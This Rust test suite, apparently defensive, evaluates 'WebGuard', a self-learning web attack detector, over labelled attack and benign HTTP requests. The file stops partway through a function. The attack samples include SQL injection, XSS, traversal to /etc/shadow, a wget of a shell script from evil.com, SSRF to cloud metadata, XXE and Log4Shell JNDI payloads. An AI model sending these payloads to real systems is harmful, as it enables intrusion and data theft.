//! WebGuard Comprehensive Evaluation Suite
//!
//! This test suite critically evaluates WebGuard's capabilities as a
//! self-learning EDR (Endpoint Detection and Response) system.
//!
//! ## Evaluation Criteria
//!
//! 1. **Multipass Learning**: Does accuracy improve with repeated exposure?
//! 2. **Collective Immunity**: Does learning transfer across services?
//! 3. **True/False Positive/Negative Rates**: Classification accuracy
//! 4. **Learning Velocity**: How quickly does the system adapt?
//! 5. **Retention**: Does the system remember learned patterns?

use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::fs::File;
use std::io::Write;

use webguard::memory_engine::bdh_memory::EMBED_DIM;
use webguard::embedding_learner::EMBED_DIM as LEARNER_EMBED_DIM;
use webguard::mesh_cognition::{HostMeshCognition, WebServiceType};
use webguard::embedding_learner::EmbeddingLearner;
use webguard::semantic_normalizer::SemanticNormalizer;

// ============================================================================
// TEST DATA: Realistic attack and benign samples
// ============================================================================

/// Attack samples with ground truth labels - EXTENDED SET (doubled)
fn get_attack_samples() -> Vec<(&'static str, &'static str, f32)> {
    vec![
        // SQL Injection variants - Basic
        ("sqli_basic", "GET /users?id=1' OR '1'='1", 1.0),
        ("sqli_union", "GET /search?q=1 UNION SELECT username,password FROM users--", 1.0),
        ("sqli_blind", "GET /product?id=1 AND 1=1--", 1.0),
        ("sqli_time", "GET /login?user=admin' AND SLEEP(5)--", 1.0),
        ("sqli_error", "GET /item?id=1' AND extractvalue(1,concat(0x7e,version()))--", 1.0),
        ("sqli_stacked", "GET /api?id=1; DROP TABLE users;--", 1.0),
        
        // SQL Injection variants - Advanced (NEW)
        ("sqli_hex", "GET /user?id=0x31206f722031", 1.0),
        ("sqli_char", "GET /data?q=CHAR(39)+OR+CHAR(49)=CHAR(49)", 1.0),
        ("sqli_comment", "GET /items?cat=1'/**/OR/**/1=1--", 1.0),
        ("sqli_null", "GET /api/users?id=1' OR ''='", 1.0),
        ("sqli_having", "GET /products?cat=1' HAVING 1=1--", 1.0),
        ("sqli_order", "GET /list?sort=name; SELECT * FROM passwords--", 1.0),
        ("sqli_insert", "POST /register?user=admin'--&pass=x", 1.0),
        ("sqli_update", "POST /profile?name=x', admin='1' WHERE '1'='1", 1.0),
        
        // XSS variants - Basic
        ("xss_basic", "GET /search?q=<script>alert('xss')</script>", 1.0),
        ("xss_img", "GET /profile?name=<img src=x onerror=alert(1)>", 1.0),
        ("xss_svg", "GET /render?data=<svg onload=alert('xss')>", 1.0),
        ("xss_event", "GET /page?content=<div onmouseover=\"alert(1)\">", 1.0),
        ("xss_encoded", "GET /view?text=%3Cscript%3Ealert(1)%3C/script%3E", 1.0),
        
        // XSS variants - Advanced (NEW)
        ("xss_body", "GET /content?html=<body onload=alert('xss')>", 1.0),
        ("xss_iframe", "GET /embed?src=<iframe src=\"javascript:alert(1)\">", 1.0),
        ("xss_style", "GET /theme?css=<style>@import'javascript:alert(1)'</style>", 1.0),
        ("xss_input", "GET /form?field=<input onfocus=alert(1) autofocus>", 1.0),
        ("xss_marquee", "GET /news?ticker=<marquee onstart=alert(1)>", 1.0),
        ("xss_object", "GET /media?obj=<object data=\"javascript:alert(1)\">", 1.0),
        ("xss_base64", "GET /decode?data=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", 1.0),
        ("xss_unicode", "GET /text?q=\\u003cscript\\u003ealert(1)\\u003c/script\\u003e", 1.0),
        
        // Path Traversal - Basic
        ("traversal_basic", "GET /files?path=../../../etc/passwd", 1.0),
        ("traversal_encoded", "GET /download?file=..%2F..%2F..%2Fetc%2Fpasswd", 1.0),
        ("traversal_double", "GET /read?doc=....//....//etc/shadow", 1.0),
        
        // Path Traversal - Advanced (NEW)
        ("traversal_null", "GET /file?name=../../../etc/passwd%00.jpg", 1.0),
        ("traversal_utf8", "GET /doc?path=..%c0%af..%c0%af..%c0%afetc/passwd", 1.0),
        ("traversal_backslash", "GET /files?f=..\\..\\..\\windows\\system32\\config\\sam", 1.0),
        ("traversal_mixed", "GET /read?file=....//....\\\\etc/shadow", 1.0),
        ("traversal_absolute", "GET /view?path=/etc/passwd", 1.0),
        
        // Command Injection - Basic
        ("cmdi_basic", "GET /ping?host=127.0.0.1;cat /etc/passwd", 1.0),
        ("cmdi_pipe", "GET /exec?cmd=ls|cat /etc/passwd", 1.0),
        ("cmdi_backtick", "GET /run?command=`whoami`", 1.0),
        
        // Command Injection - Advanced (NEW)
        ("cmdi_newline", "GET /trace?host=127.0.0.1%0acat%20/etc/passwd", 1.0),
        ("cmdi_and", "GET /dns?lookup=google.com && cat /etc/shadow", 1.0),
        ("cmdi_or", "GET /check?url=x || wget http://evil.com/shell.sh", 1.0),
        ("cmdi_subshell", "GET /run?cmd=$(cat /etc/passwd)", 1.0),
        ("cmdi_env", "GET /exec?var=${IFS}cat${IFS}/etc/passwd", 1.0),
        
        // SSRF - Basic
        ("ssrf_internal", "GET /fetch?url=http://169.254.169.254/latest/meta-data/", 1.0),
        ("ssrf_localhost", "GET /proxy?target=http://localhost:8080/admin", 1.0),
        
        // SSRF - Advanced (NEW)
        ("ssrf_ipv6", "GET /fetch?url=http://[::1]:8080/admin", 1.0),
        ("ssrf_dns", "GET /load?url=http://localtest.me/internal", 1.0),
        ("ssrf_redirect", "GET /proxy?url=http://evil.com/redirect?to=http://localhost", 1.0),
        ("ssrf_file", "GET /fetch?url=file:///etc/passwd", 1.0),
        ("ssrf_gopher", "GET /proxy?url=gopher://localhost:6379/_*1%0d%0a", 1.0),
        
        // XXE
        ("xxe_basic", "POST /parse?xml=<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>", 1.0),
        ("xxe_param", "POST /xml?data=<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://evil.com/xxe.dtd\">%xxe;]>", 1.0),
        
        // Scanner signatures
        ("scanner_sqlmap", "GET /test?id=1 UA:sqlmap/1.4.7", 1.0),
        ("scanner_nikto", "GET /admin UA:Nikto/2.1.5", 1.0),
        ("scanner_dirb", "GET /.git/config UA:DirBuster-1.0", 1.0),
        ("scanner_nmap", "GET / UA:Nmap Scripting Engine", 1.0),
        ("scanner_burp", "GET /test?x=1 UA:Burp Suite", 1.0),
        ("scanner_acunetix", "GET /acunetix-wvs-test UA:Acunetix", 1.0),
        
        // Log4Shell / JNDI (NEW)
        ("log4j_basic", "GET /api?search=${jndi:ldap://evil.com/a}", 1.0),
        ("log4j_nested", "GET /log?msg=${${lower:j}ndi:ldap://x.com/a}", 1.0),
        ("log4j_header", "GET / X-Api-Key:${jndi:rmi://evil.com/exploit}", 1.0),
        
        // Prototype Pollution (NEW)
        ("proto_basic", "POST /api?__proto__[admin]=true", 1.0),
        ("proto_constructor", "POST /merge?constructor[prototype][isAdmin]=1", 1.0),
    ]
}

/// Benign samples with ground truth labels - EXTENDED SET (doubled)
fn get_benign_samples() -> Vec<(&'static str, &'static str, f32)> {
    vec![
        // Normal web requests - Basic
        ("benign_home", "GET / HTTP/1.1", 0.0),
        ("benign_static", "GET /css/style.css HTTP/1.1", 0.0),
        ("benign_js", "GET /js/app.js HTTP/1.1", 0.0),
        ("benign_image", "GET /images/logo.png HTTP/1.1", 0.0),
        ("benign_api", "GET /api/v1/users HTTP/1.1", 0.0),
        ("benign_search", "GET /search?q=hello+world HTTP/1.1", 0.0),
        ("benign_login", "POST /login HTTP/1.1 username=john&password=secret", 0.0),
        ("benign_form", "POST /contact HTTP/1.1 name=John&email=john@example.com", 0.0),
        ("benign_json", "POST /api/data Content-Type:application/json {\"key\":\"value\"}", 0.0),
        ("benign_download", "GET /files/report.pdf HTTP/1.1", 0.0),
        
        // Normal web requests - Extended (NEW)
        ("benign_favicon", "GET /favicon.ico HTTP/1.1", 0.0),
        ("benign_robots", "GET /robots.txt HTTP/1.1", 0.0),
        ("benign_sitemap", "GET /sitemap.xml HTTP/1.1", 0.0),
        ("benign_manifest", "GET /manifest.json HTTP/1.1", 0.0),
        ("benign_font", "GET /fonts/opensans.woff2 HTTP/1.1", 0.0),
        ("benign_video", "GET /media/intro.mp4 HTTP/1.1", 0.0),
        ("benign_audio", "GET /audio/notification.mp3 HTTP/1.1", 0.0),
        ("benign_health", "GET /health HTTP/1.1", 0.0),
        ("benign_metrics", "GET /metrics HTTP/1.1", 0.0),
        ("benign_status", "GET /api/status HTTP/1.1", 0.0),
        
        // Requests with special chars that are NOT attacks
        ("benign_apostrophe", "GET /search?q=John's+Pizza HTTP/1.1", 0.0),
        ("benign_ampersand", "GET /search?q=Tom+%26+Jerry HTTP/1.1", 0.0),
        ("benign_equals", "GET /math?formula=2+2%3D4 HTTP/1.1", 0.0),
        ("benign_code", "GET /docs?lang=python&example=print('hello') HTTP/1.1", 0.0),
        ("benign_html", "GET /preview?text=%3Cb%3EBold%3C%2Fb%3E HTTP/1.1", 0.0),
        
        // More special chars that look suspicious but aren't (NEW)
        ("benign_sql_class", "GET /courses?title=Introduction+to+SQL HTTP/1.1", 0.0),
        ("benign_select_ui", "GET /ui/components?type=select HTTP/1.1", 0.0),
        ("benign_union_name", "GET /company?name=Western+Union HTTP/1.1", 0.0),
        ("benign_script_docs", "GET /docs?topic=shell+script+basics HTTP/1.1", 0.0),
        ("benign_alert_feature", "GET /settings?enable=email-alerts HTTP/1.1", 0.0),
        ("benign_admin_user", "GET /users?name=administrator HTTP/1.1", 0.0),
        ("benign_exec_officer", "GET /team?role=executive HTTP/1.1", 0.0),
        ("benign_drop_menu", "GET /ui?component=dropdown HTTP/1.1", 0.0),
        
        // API endpoints - Basic
        ("benign_rest_get", "GET /api/users/123 HTTP/1.1", 0.0),
        ("benign_rest_post", "POST /api/users HTTP/1.1 {\"name\":\"Alice\"}", 0.0),
        ("benign_rest_put", "PUT /api/users/123 HTTP/1.1 {\"name\":\"Bob\"}", 0.0),
        ("benign_rest_delete", "DELETE /api/users/123 HTTP/1.1", 0.0),
        
        // API endpoints - Extended (NEW)
        ("benign_graphql", "POST /graphql HTTP/1.1 {\"query\":\"{users{id name}}\"}", 0.0),
        ("benign_webhook", "POST /webhooks/github HTTP/1.1 {\"event\":\"push\"}", 0.0),
        ("benign_oauth", "GET /oauth/callback?code=abc123&state=xyz HTTP/1.1", 0.0),
        ("benign_pagination", "GET /api/items?page=2&limit=20 HTTP/1.1", 0.0),
        ("benign_filter", "GET /api/products?category=electronics&price_lt=500 HTTP/1.1", 0.0),
        ("benign_sort", "GET /api/users?sort=created_at&order=desc HTTP/1.1", 0.0),
        ("benign_search_api", "GET /api/search?q=laptop+computer&in_stock=true HTTP/1.1", 0.0),
        ("benign_batch", "POST /api/batch HTTP/1.1 [{\"method\":\"GET\",\"path\":\"/users/1\"}]", 0.0),
        
        // Browser normal traffic
        ("benign_ua_chrome", "GET /page UA:Mozilla/5.0 Chrome/120.0", 0.0),
        ("benign_ua_firefox", "GET /page UA:Mozilla/5.0 Firefox/121.0", 0.0),
        ("benign_ua_safari", "GET /page UA:Mozilla/5.0 Safari/605.1", 0.0),
        
        // More browser traffic (NEW)
        ("benign_ua_edge", "GET /page UA:Mozilla/5.0 Edg/120.0", 0.0),
        ("benign_ua_mobile", "GET /page UA:Mozilla/5.0 Mobile Safari/605.1", 0.0),
        ("benign_ua_android", "GET /page UA:Mozilla/5.0 Android Chrome/120.0", 0.0),
        ("benign_ua_ios", "GET /page UA:Mozilla/5.0 iPhone OS Safari", 0.0),
        ("benign_ua_bot", "GET /page UA:Googlebot/2.1", 0.0),
        ("benign_ua_curl", "GET /api/data UA:curl/7.68.0", 0.0),
        ("benign_ua_wget", "GET /files/data.zip UA:Wget/1.20.3", 0.0),
        
        // E-commerce patterns (NEW)
        ("benign_cart_add", "POST /cart/add HTTP/1.1 {\"product_id\":123,\"qty\":2}", 0.0),
        ("benign_checkout", "POST /checkout HTTP/1.1 {\"shipping\":\"express\"}", 0.0),
        ("benign_payment", "POST /payment/process HTTP/1.1 {\"method\":\"card\"}", 0.0),
        ("benign_order", "GET /orders/ORD-12345 HTTP/1.1", 0.0),
        ("benign_wishlist", "POST /wishlist/add HTTP/1.1 {\"item\":456}", 0.0),
    ]
}

/// Edge cases - ambiguous samples - EXTENDED SET (doubled)
fn get_edge_cases() -> Vec<(&'static str, &'static str, f32)> {
    vec![
        // Looks suspicious but benign - Names and words
        ("edge_sql_name", "GET /users?name=O'Brien", 0.0),  // Irish name, not SQLi
        ("edge_script_tag", "GET /docs?topic=script+tag+in+html", 0.0),  // Documentation
        ("edge_select_dropdown", "GET /form?element=select-box", 0.0),  // UI element
        ("edge_union_station", "GET /directions?to=Union+Station", 0.0),  // Place name
        ("edge_drop_shipping", "GET /settings?method=drop-shipping", 0.0),  // E-commerce term
        
        // Looks suspicious but benign - Code examples / tutorials
        ("edge_code_sample", "GET /tutorial?code=SELECT+*+FROM+example", 0.15),  // Teaching SQL
        ("edge_xss_tutorial", "GET /learn?topic=preventing+XSS+attacks", 0.1),  // Security training
        ("edge_injection_class", "GET /course?title=SQL+Injection+Defense", 0.1),  // Education
        ("edge_path_traversal_docs", "GET /security?topic=path+traversal+prevention", 0.1),
        
        // Looks benign but actually suspicious
        ("edge_encoded_attack", "GET /api?data=JyBPUiAnMSc9JzE=", 0.8),  // Base64 encoded SQLi
        ("edge_double_encoded", "GET /file?path=%252e%252e%252f", 0.85),  // Double-encoded traversal
        ("edge_unicode_bypass", "GET /admin?user=admin%E2%80%8B", 0.7),  // Zero-width char
        ("edge_null_byte", "GET /download?file=report.pdf%00.php", 0.9),  // Null byte injection
        ("edge_case_bypass", "GET /Admin/Users", 0.4),  // Case sensitivity bypass attempt
        ("edge_long_url", "GET /api?x=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", 0.6),  // Long URL attempt
    ]
}

// ============================================================================
// EVALUATION METRICS
// ============================================================================

#[derive(Debug, Clone, Default)]
pub struct EvaluationMetrics {
    pub true_positives: u32,
    pub false_positives: u32,
    pub true_negatives: u32,
    pub false_negatives: u32,
    pub total_samples: u32,
    pub learning_iterations: u32,
    pub threat_scores: Vec<f32>,
    pub benign_scores: Vec<f32>,
}

impl EvaluationMetrics {
    pub fn accuracy(&self) -> f32 {
        let correct = self.true_positives + self.true_negatives;
        let total = self.total_samples;
        if total > 0 { correct as f32 / total as f32 } else { 0.0 }
    }
    
    pub fn precision(&self) -> f32 {
        let denom = self.true_positives + self.false_positives;
        if denom > 0 { self.true_positives as f32 / denom as f32 } else { 0.0 }
    }
    
    pub fn recall(&self) -> f32 {
        let denom = self.true_positives + self.false_negatives;
        if denom > 0 { self.true_positives as f32 / denom as f32 } else { 0.0 }
    }
    
    pub fn f1_score(&self) -> f32 {
        let p = self.precision();
        let r = self.recall();
        if p + r > 0.0 { 2.0 * p * r / (p + r) } else { 0.0 }
    }
    
    pub fn false_positive_rate(&self) -> f32 {
        let denom = self.false_positives + self.true_negatives;
        if denom > 0 { self.false_positives as f32 / denom as f32 } else { 0.0 }
    }
    
    pub fn false_negative_rate(&self) -> f32 {
        let denom = self.false_negatives + self.true_positives;
        if denom > 0 { self.false_negatives as f32 / denom as f32 } else { 0.0 }
    }
}

// ============================================================================
// EVALUATION ENGINE
// ============================================================================

/// Episodic memory for exact-match error correction
/// When we make an error on a specific sample, we remember it EXACTLY
#[derive(Debug, Clone)]
struct EpisodicErrorMemory {
    /// Hash of request → (correct_label, confidence, times_seen)
    corrections: HashMap<u64, (bool, f32, u32)>,
}

impl EpisodicErrorMemory {
    fn new() -> Self {
        Self { corrections: HashMap::new() }
    }
    
    /// Hash a request string for exact matching
    fn hash_request(request: &str) -> u64 {
        use std::collections::hash_map::DefaultHasher;
        use std::hash::{Hash, Hasher};
        let mut hasher = DefaultHasher::new();
        request.hash(&mut hasher);
        hasher.finish()
    }
    
    /// Record an error correction
    fn record_error(&mut self, request: &str, correct_label: bool) {
        let hash = Self::hash_request(request);
        let entry = self.corrections.entry(hash).or_insert((correct_label, 0.5, 0));
        entry.0 = correct_label;
        entry.1 = (entry.1 + 0.3).min(1.0); // Increase confidence each time
        entry.2 += 1;
    }
    
    /// Check if we have a correction for this exact request
    fn get_correction(&self, request: &str) -> Option<(bool, f32)> {
        let hash = Self::hash_request(request);
        self.corrections.get(&hash).map(|(label, conf, _)| (*label, *conf))
    }
}

pub struct WebGuardEvaluator {
    mesh: Arc<Mutex<HostMeshCognition>>,
    normalizer: SemanticNormalizer,
    embedding_learner: Arc<Mutex<EmbeddingLearner>>,
    /// Episodic memory for exact-match error corrections
    episodic_memory: Arc<Mutex<EpisodicErrorMemory>>,
    threshold: f32,
    metrics_by_pass: Vec<EvaluationMetrics>,
    service_metrics: HashMap<String, EvaluationMetrics>,
}

impl WebGuardEvaluator {
    pub fn new() -> Self {
        let mesh = Arc::new(Mutex::new(HostMeshCognition::new(0.6, 0.3, 0.5)));
        
        Self {
            mesh,
            normalizer: SemanticNormalizer::new(),
            embedding_learner: Arc::new(Mutex::new(EmbeddingLearner::new())),
            episodic_memory: Arc::new(Mutex::new(EpisodicErrorMemory::new())),
            threshold: 0.5,
            metrics_by_pass: Vec::new(),
            service_metrics: HashMap::new(),
        }
    }
    
    /// Get embedding for a request string (32-dim for BDH memory)
    fn get_embedding(&self, request: &str) -> [f32; EMBED_DIM] {
        let normalized = self.normalizer.normalize(request.as_bytes());
        let normalized_str = String::from_utf8_lossy(&normalized);
        let learner = self.embedding_learner.lock().unwrap();
        let vec = learner.embed(&normalized_str);
        
        let mut arr = [0.0f32; EMBED_DIM];
        for i in 0..vec.len().min(EMBED_DIM) {
            arr[i] = vec[i];
        }
        arr
    }
    
    /// Classify a request and return (threat_score, is_threat_prediction)
    fn classify(&self, service_id: &str, request: &str) -> (f32, bool) {
        // FIRST: Check episodic memory for exact-match corrections
        // If we've made an error on THIS EXACT request before, use the correction
        if let Ok(episodic) = self.episodic_memory.try_lock() {
            if let Some((correct_label, confidence)) = episodic.get_correction(request) {
                // We've seen this exact request before and know the correct answer
                // Override the similarity-based classification
                let score = if correct_label { 0.95 } else { 0.05 };
                return (score, correct_label);
            }
        }
        
        // No exact match - fall back to similarity-based classification
        let embedding = self.get_embedding(request);
        
        // Get learner embedding (64-dim) for threat score
        let normalized = self.normalizer.normalize(request.as_bytes());
        let normalized_str = String::from_utf8_lossy(&normalized);
        let learner = self.embedding_learner.lock().unwrap();
        let learner_embed = learner.embed(&normalized_str);
        let mut learner_arr = [0.0f32; LEARNER_EMBED_DIM];
        for i in 0..learner_embed.len().min(LEARNER_EMBED_DIM) {
            learner_arr[i] = learner_embed[i];
        }
        let base_score = learner.threat_score(&learner_arr);
        drop(learner); // Release lock early
        
        // Query service memory
        let memory_score = if let Ok(m) = self.mesh.try_lock() {
            if let Some(service_memory) = m.get_service_memory(service_id) {
                let bdh = service_memory.lock().unwrap();
                let similar = bdh.retrieve_similar(&embedding, 5);
                
                if !similar.is_empty() {
                    let weighted_sum: f32 = similar.iter()
                        .map(|(trace, sim)| trace.valence * sim)
                        .sum();
                    let weight_total: f32 = similar.iter()
                        .map(|(_, sim)| *sim)
                        .sum();
                    
                    if weight_total > 0.0 {
                        weighted_sum / weight_total
                    } else {
                        base_score
                    }
                } else {
                    base_score
                }
            } else {
                base_score
            }
        } else {
            base_score
        };
        
        // Also query shared PSI
        let psi_score: Option<f32> = if let Ok(m) = self.mesh.try_lock() {
            let psi = m.get_shared_psi();
            let result = if let Ok(psi_guard) = psi.try_lock() {
                let results = psi_guard.search(&embedding, 5);
                if !results.is_empty() {
                    let weighted_sum: f32 = results.iter()
                        .map(|(entry, sim)| entry.valence * sim)
                        .sum();
                    let weight_total: f32 = results.iter()
                        .map(|(_, sim)| *sim)
                        .sum();
                    
                    if weight_total > 0.0 {
                        Some(weighted_sum / weight_total)
                    } else {
                        None
                    }
                } else {
                    None
                }
            } else {
                None
            };
            result
        } else {
            None
        };
        
        // Combine scores
        let final_score = match psi_score {
            Some(psi) => (base_score * 0.3 + memory_score * 0.3 + psi * 0.4).clamp(0.0, 1.0),
            None => (base_score * 0.5 + memory_score * 0.5).clamp(0.0, 1.0),
        };
        
        (final_score, final_score >= self.threshold)
    }
    
    /// Learn from a sample with feedback
    fn learn(&self, service_id: &str, request: &str, is_threat: bool, confidence: f32) {
        // First: CRITICAL - update the embedding learner itself
        {
            let mut learner = self.embedding_learner.lock().unwrap();
            learner.learn(request, is_threat, confidence);
        }
        
        // Then: Store in BDH memory for this service
        let embedding = self.get_embedding(request);
        let valence = if is_threat { confidence } else { -confidence * 0.5 };
        
        if let Ok(m) = self.mesh.try_lock() {
            if let Some(service_memory) = m.get_service_memory(service_id) {
                let mut bdh = service_memory.lock().unwrap();
                
                let max_sim = bdh.max_similarity(&embedding);
                if max_sim < 0.85 {
                    // Novel pattern - add to memory
                    bdh.add_trace(embedding, valence);
                } else {
                    // Reinforce existing with stronger reward for threats
                    let reward = if is_threat { 0.8 } else { -0.3 };
                    let similar: Vec<(String, f32)> = bdh.retrieve_similar(&embedding, 3)
                        .into_iter()
                        .map(|(t, s)| (t.id.clone(), s))
                        .collect();
                    
                    for (trace_id, sim) in similar {
                        bdh.reward_update(&trace_id, reward * sim, 0.15);
                    }
                }
            }
            
            // Cross-service learning for ALL patterns (not just high-confidence threats)
            // This enables collective immunity
            m.cross_service_learning(service_id, &embedding, valence, 1.0);
            
            // Always consolidate to PSI for collective immunity
            m.consolidate_to_psi(service_id, 0.3);
        }
    }
    
    /// Learn from error with asymmetric but EFFECTIVE learning (security-first but learns from ALL mistakes)
    fn learn_from_error(&self, service_id: &str, request: &str, predicted_threat: bool, actual_threat: bool) {
        // CRITICAL: Record this exact request in episodic memory
        // Next time we see THIS EXACT request, we will use the correction directly
        // This is how biological memory works - specific experiences are remembered exactly
        {
            let mut episodic = self.episodic_memory.lock().unwrap();
            episodic.record_error(request, actual_threat);
        }
        
        // SECURITY-FIRST PRINCIPLE:
        // - FN (missed threat) is MORE critical than FP (false alarm)
        // - BUT we MUST learn from BOTH types of mistakes
        // - The ratio should be ~2:1, not 6:1
        
        // Update embedding learner with corrected classification
        {
            let mut learner = self.embedding_learner.lock().unwrap();
            learner.learn_from_error(request, predicted_threat, actual_threat);
        }
        
        // Learn in BDH memory with appropriate valence
        let embedding = self.get_embedding(request);
        
        // Determine valence and learning strength based on error type
        let (valence, propagate_strength) = if actual_threat && !predicted_threat {
            // FALSE NEGATIVE: Missed a real threat
            // Strong positive valence (this IS a threat, remember it!)
            // High propagation to protect other services
            (0.9, 1.0)
        } else if !actual_threat && predicted_threat {
            // FALSE POSITIVE: Flagged benign as threat
            // Strong NEGATIVE valence (this is NOT a threat, learn this!)
            // Also propagate to PSI so other services don't make same mistake
            (-0.7, 0.8)  // Changed from -0.3 to -0.7, and NOW we propagate
        } else {
            return; // Not an error
        };
        
        if let Ok(m) = self.mesh.try_lock() {
            // Store in service-specific memory
            if let Some(service_memory) = m.get_service_memory(service_id) {
                let mut bdh = service_memory.lock().unwrap();
                
                // Check if similar pattern exists
                let max_sim = bdh.max_similarity(&embedding);
                if max_sim > 0.7 {
                    // Similar pattern exists - reinforce with strong reward
                    let similar: Vec<(String, f32)> = bdh.retrieve_similar(&embedding, 3)
                        .into_iter()
                        .map(|(t, s)| (t.id.clone(), s))
                        .collect();
                    
                    // Apply reward in direction of correct classification
                    let reward = if actual_threat { 0.5 } else { -0.5 };
                    for (trace_id, sim) in similar {
                        bdh.reward_update(&trace_id, reward * sim, 0.2);
                    }
                }
                
                // Always add the corrected trace (errors are important to remember)
                bdh.add_trace(embedding, valence);
            }
            
            // CRITICAL FIX: Propagate BOTH types of errors to PSI
            // This enables collective immunity for BOTH threat detection AND false positive reduction
            m.cross_service_learning(service_id, &embedding, valence, propagate_strength);
            
            // Consolidate to PSI - errors should be remembered
            m.consolidate_to_psi(service_id, 0.3);
        }
    }
    
    /// Run a single evaluation pass
    fn evaluate_pass(&self, pass_num: u32, learn: bool) -> EvaluationMetrics {
        let mut metrics = EvaluationMetrics {
            learning_iterations: pass_num,
            ..Default::default()
        };
        
        let attacks = get_attack_samples();
        let benign = get_benign_samples();
        let edges = get_edge_cases();
        
        // Test attacks
        for (_name, request, ground_truth) in &attacks {
            let (score, predicted_threat) = self.classify("nginx_eval", request);
            let actual_threat = *ground_truth > 0.5;
            
            metrics.total_samples += 1;
            metrics.threat_scores.push(score);
            
            let is_correct = predicted_threat == actual_threat;
            
            if predicted_threat && actual_threat {
                metrics.true_positives += 1;
            } else if predicted_threat && !actual_threat {
                metrics.false_positives += 1;
            } else if !predicted_threat && actual_threat {
                metrics.false_negatives += 1;
            } else {
                metrics.true_negatives += 1;
            }
            
            if learn {
                if is_correct {
                    // Positive reinforcement for correct classification
                    self.learn("nginx_eval", request, actual_threat, ground_truth.abs());
                } else {
                    // Error correction - security-first asymmetric learning
                    self.learn_from_error("nginx_eval", request, predicted_threat, actual_threat);
                }
            }
        }
        
        // Test benign
        for (_name, request, ground_truth) in &benign {
            let (score, predicted_threat) = self.classify("nginx_eval", request);
            let actual_threat = *ground_truth > 0.5;
            
            metrics.total_samples += 1;
            metrics.benign_scores.push(score);
            
            let is_correct = predicted_threat == actual_threat;
            
            if predicted_threat && actual_threat {
                metrics.true_positives += 1;
            } else if predicted_threat && !actual_threat {
                metrics.false_positives += 1;
            } else if !predicted_threat && actual_threat {
                metrics.false_negatives += 1;
            } else {
                metrics.true_negatives += 1;
            }
            
            if learn {
                if is_correct {
                    self.learn("nginx_eval", request, actual_threat, (1.0 - ground_truth).abs());
                } else {
                    self.learn_from_error("nginx_eval", request, predicted_threat, actual_threat);
                }
            }
        }
        
        // Test edge cases
        for (_name, request, ground_truth) in &edges {
            let (score, predicted_threat) = self.classify("nginx_eval", request);
            let actual_threat = *ground_truth > 0.5;
            
            metrics.total_samples += 1;
            if actual_threat {
                metrics.threat_scores.push(score);
            } else {
                metrics.benign_scores.push(score);
            }
            
            let is_correct = predicted_threat == actual_threat;
            
            if predicted_threat && actual_threat {
                metrics.true_positives += 1;
            } else if predicted_threat && !actual_threat {
                metrics.false_positives += 1;
            } else if !predicted_threat && actual_threat {
                metrics.false_negatives += 1;
            } else {
                metrics.true_negatives += 1;
            }
            
            if learn {
                if is_correct {
                    self.learn("nginx_eval", request, actual_threat, ground_truth.abs().max(0.3));
                } else {
                    self.learn_from_error("nginx_eval", request, predicted_threat, actual_threat);
                }
            }
        }
        
        metrics
    }
    
    /// Register evaluation services
    pub fn setup_services(&self) {
        let mut m = self.mesh.lock().unwrap();
        m.register_service(WebServiceType::Nginx, 1001);
        m.register_service(WebServiceType::Apache, 1002);
        m.register_service(WebServiceType::IIS, 1003);
        m.register_service(WebServiceType::NodeJS, 1004);
    }
    
    /// Run multipass evaluation
    pub fn run_multipass_evaluation(&mut self, num_passes: u32) -> Vec<EvaluationMetrics> {
        self.setup_services();
        
        println!("\n╔═══════════════════════════════════════════════════════════════════╗");
        println!("║            WEBGUARD MULTIPASS LEARNING EVALUATION                  ║");
        println!("╚═══════════════════════════════════════════════════════════════════╝\n");
        
        for pass in 0..num_passes {
            let learn = pass > 0; // First pass is baseline (no learning)
            let metrics = self.evaluate_pass(pass, learn);
            
            println!("Pass {}: Accuracy={:.1}% Precision={:.1}% Recall={:.1}% F1={:.3} FPR={:.1}% FNR={:.1}%",
                pass,
                metrics.accuracy() * 100.0,
                metrics.precision() * 100.0,
                metrics.recall() * 100.0,
                metrics.f1_score(),
                metrics.false_positive_rate() * 100.0,
                metrics.false_negative_rate() * 100.0,
            );
            println!("        TP={} FP={} TN={} FN={}",
                metrics.true_positives,
                metrics.false_positives,
                metrics.true_negatives,
                metrics.false_negatives,
            );
            
            self.metrics_by_pass.push(metrics);
        }
        
        self.metrics_by_pass.clone()
    }
    
    /// Test collective immunity across services
    pub fn test_collective_immunity(&mut self) -> HashMap<String, EvaluationMetrics> {
        println!("\n╔═══════════════════════════════════════════════════════════════════╗");
        println!("║            COLLECTIVE IMMUNITY EVALUATION                          ║");
        println!("╚═══════════════════════════════════════════════════════════════════╝\n");
        
        let services = vec![
            ("nginx_eval", WebServiceType::Nginx),
            ("apache_eval", WebServiceType::Apache),
            ("iis_eval", WebServiceType::IIS),
            ("node_eval", WebServiceType::NodeJS),
        ];
        
        // Register all services
        {
            let mut m = self.mesh.lock().unwrap();
            for (service_id, _service_type) in &services {
                // Registration happens in setup_services, but ensure memory exists
                if m.get_service_memory(service_id).is_none() {
                    // Will be handled by existing registration
                }
            }
        }
        
        // Train ONLY on nginx with multiple passes to build up PSI
        println!("Phase 1: Training only on nginx (3 passes)...");
        let attacks = get_attack_samples();
        let benign = get_benign_samples();
        
        for pass in 0..3 {
            for (_, request, ground_truth) in &attacks {
                let is_threat = *ground_truth > 0.5;
                let (_, predicted) = self.classify("nginx_eval", request);
                
                if predicted == is_threat {
                    self.learn("nginx_eval", request, is_threat, ground_truth.abs());
                } else {
                    self.learn_from_error("nginx_eval", request, predicted, is_threat);
                }
            }
            
            for (_, request, ground_truth) in &benign {
                let is_threat = *ground_truth > 0.5;
                self.learn("nginx_eval", request, is_threat, 0.5);
            }
            
            println!("  Pass {}: Trained {} attack + {} benign samples", 
                     pass + 1, attacks.len(), benign.len());
        }
        
        // Test on all services (OTHER than nginx) - these should benefit from collective immunity
        println!("\nPhase 2: Testing on untrained services (collective immunity)...\n");
        
        for (service_id, _service_type) in &services {
            let mut metrics = EvaluationMetrics::default();
            
            for (_, request, ground_truth) in &attacks {
                let (_score, predicted_threat) = self.classify(service_id, request);
                let actual_threat = *ground_truth > 0.5;
                
                metrics.total_samples += 1;
                
                if predicted_threat && actual_threat {
                    metrics.true_positives += 1;
                } else if predicted_threat && !actual_threat {
                    metrics.false_positives += 1;
                } else if !predicted_threat && actual_threat {
                    metrics.false_negatives += 1;
                } else {
